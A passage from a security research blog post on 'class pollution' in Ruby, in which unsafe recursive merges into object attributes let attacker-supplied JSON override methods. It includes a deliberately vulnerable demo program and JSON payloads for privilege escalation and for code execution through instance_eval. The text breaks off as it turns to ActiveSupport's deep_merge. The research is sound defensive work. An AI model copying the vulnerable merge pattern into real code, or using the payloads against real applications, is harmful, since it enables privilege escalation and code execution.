---
title: Class Pollution in Ruby: A Deep Dive into Exploiting Recursive Merges
url: https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html
source: Over Security - Cybersecurity news aggregator
date: 2024-10-03
fetch_date: 2025-10-06T18:53:36.439451
---

# Class Pollution in Ruby: A Deep Dive into Exploiting Recursive Merges

[

](https://doyensec.com/img/home-video.mp4)

[![](/public/images/doyensec-logo.svg)](/index.html)

[![](/public/images/logo.svg)](/index.html)

#### ABOUT US

We are [**security engineers**](https://doyensec.com) who break bits and tell stories.

Visit us
[doyensec.com](https://doyensec.com)

Follow us
[@doyensec](https://twitter.com/doyensec)

Engage us
info@doyensec.com

#### Blog Archive

* 2025
* 2024
* 2023
* 2022
* 2021
* 2020
* 2019
* 2018
* 2017

© 2025 [Doyensec LLC](https://doyensec.com) [![](/public/images/rss.png)](/atom.xml "RSS")

# Class Pollution in Ruby: A Deep Dive into Exploiting Recursive Merges

02 Oct 2024 - Posted by RaÃºl MijÃ¡n

## Introduction

In this post, we are going to explore a rarely discussed class of vulnerabilities in Ruby, known as **class pollution**. This concept is inspired by the idea of prototype pollution in JavaScript, where recursive merges are exploited to poison the prototype of objects, leading to unexpected behaviors. This idea was initially discussed in a [blog post](https://blog.abdulrah33m.com/prototype-pollution-in-python/) about prototype pollution in Python, in which the researcher used recursive merging to poison class variables and eventually global variables via the `__globals__` attribute.

In Ruby, we can categorize class pollution into three main cases:

1. **Merge on Hashes**: In this scenario, class pollution isnât possible because the merge operation is confined to the hash itself.
2. **Merge on Attributes (Non-Recursive)**: Here, we can poison the instance variables of an object, potentially replacing methods by injecting return values. This pollution is limited to the object itself and does not affect the class.

```
current_obj.instance_variable_set("@#{key}", new_object)
current_obj.singleton_class.attr_accessor key
```

1. **Merge on Attributes (Recursive)**: In this case, the recursive nature of the merge allows us to escape the object context and poison attributes or methods of parent classes or even unrelated classes, leading to a broader impact on the application.

## Merge on Attributes

Letâs start by examining a code example where we exploit a recursive merge to modify object methods and alter the applicationâs behavior. This type of pollution is limited to the object itself.

```
require 'json'

# Base class for both Admin and Regular users
class Person

  attr_accessor :name, :age, :details

  def initialize(name:, age:, details:)
    @name = name
    @age = age
    @details = details
  end

  # Method to merge additional data into the object
  def merge_with(additional)
    recursive_merge(self, additional)
  end

  # Authorize based on the `to_s` method result
  def authorize
    if to_s == "Admin"
      puts "Access granted: #{@name} is an admin."
    else
      puts "Access denied: #{@name} is not an admin."
    end
  end

  # Health check that executes all protected methods using `instance_eval`
  def health_check
    protected_methods().each do |method|
      instance_eval(method.to_s)
    end
  end

  private

  def recursive_merge(original, additional, current_obj = original)
    additional.each do |key, value|

      if value.is_a?(Hash)
        if current_obj.respond_to?(key)
          next_obj = current_obj.public_send(key)
          recursive_merge(original, value, next_obj)
        else
          new_object = Object.new
          current_obj.instance_variable_set("@#{key}", new_object)
          current_obj.singleton_class.attr_accessor key
        end
      else
        current_obj.instance_variable_set("@#{key}", value)
        current_obj.singleton_class.attr_accessor key
      end
    end
    original
  end

  protected

  def check_cpu
    puts "CPU check passed."
  end

  def check_memory
    puts "Memory check passed."
  end
end

# Admin class inherits from Person
class Admin < Person
  def initialize(name:, age:, details:)
    super(name: name, age: age, details: details)
  end

  def to_s
    "Admin"
  end
end

# Regular user class inherits from Person
class User < Person
  def initialize(name:, age:, details:)
    super(name: name, age: age, details: details)
  end

  def to_s
    "User"
  end
end

class JSONMergerApp
  def self.run(json_input)
    additional_object = JSON.parse(json_input)

    # Instantiate a regular user
    user = User.new(
      name: "John Doe",
      age: 30,
      details: {
        "occupation" => "Engineer",
        "location" => {
          "city" => "Madrid",
          "country" => "Spain"
        }
      }
    )

    # Perform a recursive merge, which could override methods
    user.merge_with(additional_object)

    # Authorize the user (privilege escalation vulnerability)
    # ruby class_pollution.rb '{"to_s":"Admin","name":"Jane Doe","details":{"location":{"city":"Barcelona"}}}'
    user.authorize

    # Execute health check (RCE vulnerability)
    # ruby class_pollution.rb '{"protected_methods":["puts 1"],"name":"Jane Doe","details":{"location":{"city":"Barcelona"}}}'
    user.health_check

  end
end

if ARGV.length != 1
  puts "Usage: ruby class_pollution.rb 'JSON_STRING'"
  exit
end

json_input = ARGV[0]
JSONMergerApp.run(json_input)
```

In the provided code, we perform a recursive merge on the attributes of the `User` object. This allows us to inject or override values, potentially altering the objectâs behavior without directly modifying the class definition.

### How It Works:

1. **Initialization and Setup:**
   * The `User` object is initialized with specific attributes: `name`, `age`, and `details`. These attributes are stored as instance variables within the object.
2. **Merge:**
   * The `merge_with` method is called with a JSON input that represents the additional data to be merged into the `User` object.
3. **Altering Object Behavior:**
   * By passing carefully crafted JSON data, we can modify or inject new instance variables that affect how the `User` object behaves.
   * For example, in the `authorize` method, the `to_s` method determines whether the user is granted admin privileges. By injecting a new `to_s` method with a return value of `"Admin"`, we can escalate the userâs privileges.
   * Similarly, in the `health_check` method, we can inject arbitrary code execution by overriding methods that are called via `instance_eval`.

### Example Exploits:

* **Privilege Escalation:**
  `ruby class_pollution.rb {"to_s":"Admin","name":"Jane Doe","details":{"location":{"city":"Barcelona"}}}`
  + This injects a new `to_s` method that returns `"Admin"`, granting the user unauthorized admin privileges.
* **Remote Code Execution:**
  `ruby class_pollution.rb {"protected_methods":["puts 1"],"name":"Jane Doe","details":{"location":{"city":"Barcelona"}}}`
  + This injects a new method into the `protected_methods` list, which is then executed by `instance_eval`, allowing arbitrary code execution.

![Class Pollution Gadgets](../../../public/images/class-pollution-gadgets.png)

### Limitations:

* The aforementioned changes are limited to the specific object instance and do not affect other instances of the same class. This means that while the objectâs behavior is altered, other objects of the same class remain unaffected.

This example highlights how seemingly innocuous operations like recursive merges can be leveraged to introduce severe vulnerabilities if not properly managed. By understanding these risks, developers can better protect their applications from such exploits.

## Real-World Cases

Next, weâll explore two of the most popular libraries for performing merges in Ruby and see how they might be vulnerable to class pollution. Itâs important to note that there are other libraries potentially affected by this class of issues and the overall impact of these vulnerabilities varies.

### 1. ActiveSupportâs `deep_merge`

*ActiveSupport*, a built-in component of Ruby on Rails, provides a `deep_merge` method for hashes. By itself, this method isnât exploitable given it is limited to hashes....